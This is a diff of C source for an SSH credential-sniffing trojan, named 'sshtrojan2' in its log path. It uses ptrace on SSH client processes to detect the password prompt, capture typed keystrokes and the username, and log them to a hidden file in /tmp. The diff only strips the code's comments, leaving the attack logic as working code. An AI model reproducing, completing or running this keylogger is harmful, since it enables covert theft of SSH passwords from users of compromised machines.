@@ -17,8 +17,6 @@
 #define LOG_FILE        "/tmp/.log_sshtrojan2.txt"
 #define MAX_TRACED_PIDS 64
 
-/* ---------- per-PID syscall entry/exit toggle ---------- */
-
 static struct { pid_t pid; int in_entry; } pid_states[MAX_TRACED_PIDS];
 
 static void pid_state_clear(void) {
@@ -31,7 +29,7 @@ static int pid_state_toggle(pid_t pid) {
             return (pid_states[i].in_entry ^= 1);
         if (pid_states[i].pid == 0) {
             pid_states[i].pid = pid;
-            return (pid_states[i].in_entry = 1); /* first stop = entry */
+            return (pid_states[i].in_entry = 1); 
         }
     }
     return 0;
@@ -45,8 +43,6 @@ static void pid_state_remove(pid_t pid) {
         }
 }
 
-/* ---------- helpers ---------- */
-
 static void peek_mem(pid_t pid, unsigned long addr, char *buf, size_t len) {
     for (size_t i = 0; i < len; ) {
         errno = 0;
@@ -59,7 +55,6 @@ static void peek_mem(pid_t pid, unsigned long addr, char *buf, size_t len) {
     buf[len] = '\0';
 }
 
-/* Resolve login username from SSH cmdline, falling back to process UID. */
 static void ssh_username(pid_t pid, char *out, size_t outsz) {
     char path[64];
     snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
@@ -118,8 +113,6 @@ static void set_trace_opts(pid_t pid) {
            PTRACE_O_TRACECLONE   | PTRACE_O_TRACEEXEC);
 }
 
-/* ---------- tracer ---------- */
-
 static void attach_and_trace(pid_t pid, const char *user) {
     int  status, traced = 0, capturing = 0, passlen = 0;
     char password[256] = {0};
@@ -145,7 +138,6 @@ static void attach_and_trace(pid_t pid, const char *user) {
 
         int evt = status >> 16;
 
-        /* New child from fork/clone — inherit tracing. */
         if (evt == PTRACE_EVENT_FORK || evt == PTRACE_EVENT_CLONE) {
             unsigned long cpid = 0;
             ptrace(PTRACE_GETEVENTMSG, spid, NULL, &cpid);
@@ -157,12 +149,11 @@ static void attach_and_trace(pid_t pid, const char *user) {
             continue;
         }
 
-        /* Syscall-exit stop. */
         if (WSTOPSIG(status) == (SIGTRAP | 0x80) && !pid_state_toggle(spid)) {
             struct user_regs_struct regs;
             ptrace(PTRACE_GETREGS, spid, NULL, &regs);
 
-            /* Arm capture when SSH writes the password prompt. */
+
             if (regs.orig_rax == SYS_write && (long)regs.rax > 0) {
                 long wlen = (long)regs.rax > 255 ? 255 : (long)regs.rax;
                 char wbuf[256] = {0};
@@ -173,7 +164,6 @@ static void attach_and_trace(pid_t pid, const char *user) {
                 }
             }
 
-            /* Accumulate 1-byte reads as password keystrokes. */
             if (capturing && regs.orig_rax == SYS_read && (long)regs.rax == 1) {
                 char c = 0;
                 peek_mem(spid, regs.rsi, &c, 1);
@@ -200,7 +190,6 @@ done:
     if (logf) fclose(logf);
 }
 
-/* ---------- netlink process event monitor ---------- */
 
 struct nlcn_msg {
     struct nlmsghdr       nl_hdr;
